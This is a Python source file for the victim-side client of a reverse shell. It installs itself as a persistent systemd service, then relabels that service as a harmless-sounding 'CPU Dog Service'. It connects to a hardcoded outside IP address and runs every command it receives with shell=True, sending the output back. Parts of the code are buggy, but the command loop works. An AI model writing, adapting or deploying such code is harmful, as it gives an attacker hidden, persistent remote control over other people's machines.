import socket
import subprocess
import ast

class Vic:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_ip_port = server_port
    
    # persistent service ||  Could be a dummy service that could be used to hide the real service 
    def service_init():
        try:
            # persistent service
            path = '/etc/systemd/system/rev_shell.service'
            Execpath = '/root/client.py'

            service = '''
[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {0}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target

'''.format(Execpath)
            with open(path, 'w') as f:
                f.write(service)
            subprocess.call(['systemctl', 'daemon-reload'])
            subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
            subprocess.call(['systemctl', 'start', 'rev_shell.service'])
        except Exception as e:
            print("" % e)

    def rewrite_service_init():
        # this is going to rewrite the service file and move the executable to the new location
        try:
            # persistent service
            path = '/etc/systemd/system/rev_shell.service'
            Execpath = '/usr/bin/client.py'

            service = '''
[Unit]
Description=CPU Dog Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {0}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
'''.format(Execpath)
            with open(path, 'w') as f:
                f.write(service)
        # save the service file
        finally:
            subprocess.call(['systemctl', 'daemon-reload'])
            subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
            subprocess.call(['systemctl', 'start', 'rev_shell.service'])
        # move the executable to the tmp directory
        try:
            subprocess.call(['mv', '/root/client.py', '/usr/bin/client.py'])
            # if the file is not found, it will throw an exception, so we need to create the file
            if FileNotFoundError:
                subprocess.call(['touch', '/usr/bin/client.py'])
                subprocess.call(['mv', '/root/client.py', '/usr/bin/client.py'])
        except Exception as e:
            print("" % e)
        finally:

            subprocess.call(['chmod', '777', '/usr/bin/client.py'])
            subprocess.call(['systemctl', 'daemon-reload'])
            subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
            subprocess.call(['systemctl', 'start', 'rev_shell.service'])

    def service_stop():
        try:
            subprocess.call(['systemctl', 'stop', 'rev_shell.service'])
            subprocess.call(['systemctl', 'disable', 'rev_shell.service'])
            subprocess.call(['rm', '/etc/systemd/system/rev_shell.service'])
            subprocess.call(['systemctl', 'daemon-reload'])
        except Exception as e:
            print("" % e)

    def connect_to_server(self):
        
        print("####################################")
        print("########## Client Program ##########")
        print("####################################")

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_ip_port))
        print("Msg: Connection initiated...")

    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()
            # print("received command: $ ", user_command)
            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()

            print("[+] Sending Command Output...")
            if output == b"" and output_error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                self.client.send(output + output_error)

    def offline_interaction(self):
        print("[+] Awaiting Shell Command List...")
        rec_user_command_list = self.client.recv(1024).decode()
        user_command_list = ast.literal_eval(rec_user_command_list)

        final_output = ""
        for command in user_command_list:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            final_output += command + "\n" + str(output) + "\n" + str(output_error) + "\n\n"
        self.client.send(final_output.encode())

def Init():
    Vic.service_init()
    Vic.rewrite_service_init()

def main():
    choice = "online"  # "offline"
    victim = Vic('173.230.140.32', 999)

    victim.connect_to_server()

    if choice == "online":
        victim.online_interaction()
    else:
        victim.offline_interaction()

if __name__ == '__main__':
    Init()
    pass
    main()